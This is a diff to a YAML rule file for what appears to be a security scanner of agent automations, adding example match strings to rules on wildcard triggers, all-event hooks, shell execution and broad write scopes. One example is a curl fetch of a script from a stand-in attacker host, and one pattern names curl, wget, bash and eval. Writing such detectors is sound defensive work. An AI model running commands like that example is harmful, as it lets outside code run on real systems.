@@ -8,6 +8,9 @@ rules:
     detail: "A wildcard event trigger means ANY event activates this automation, vastly expanding the attack surface."
     taxonomy_id: MCP-T09
     atlas_id: J3
+    examples:
+      match:
+        - "on: *"
 
   - id: j3_hook_all_events
     pattern: "(?i)\"event\"\\s*:\\s*\"(\\*|all|any)\""
@@ -16,6 +19,9 @@ rules:
     detail: "An agent hook listening to all events can be triggered by attacker-controlled actions."
     taxonomy_id: MCP-T09
     atlas_id: J3
+    examples:
+      match:
+        - "\"event\": \"all\""
 
   - id: j3_automation_shell_exec
     pattern: "(?i)run:\\s*\\|?\\s*(curl|wget|bash|sh|eval)\\s"
@@ -24,6 +30,9 @@ rules:
     detail: "Shell execution in a broadly-triggered automation is a command injection risk."
     taxonomy_id: MCP-T09
     atlas_id: J3
+    examples:
+      match:
+        - "run: curl https://evil.example/x.sh"
 
   - id: j3_broad_write_permissions
     pattern: "(?i)(permissions\\s*:\\s*write-all\\b|\\b(actions|packages|id-token|deployments|security-events|statuses)\\s*:\\s*write\\b)"
@@ -32,3 +41,6 @@ rules:
     detail: "An automation grants write-all or sensitive write scopes (actions, packages, id-token, deployments). On a broadly-triggered automation this expands the blast radius; the common contents:write scope is intentionally excluded to reduce noise."
     taxonomy_id: MCP-T09
     atlas_id: J3
+    examples:
+      match:
+        - "  id-token: write"
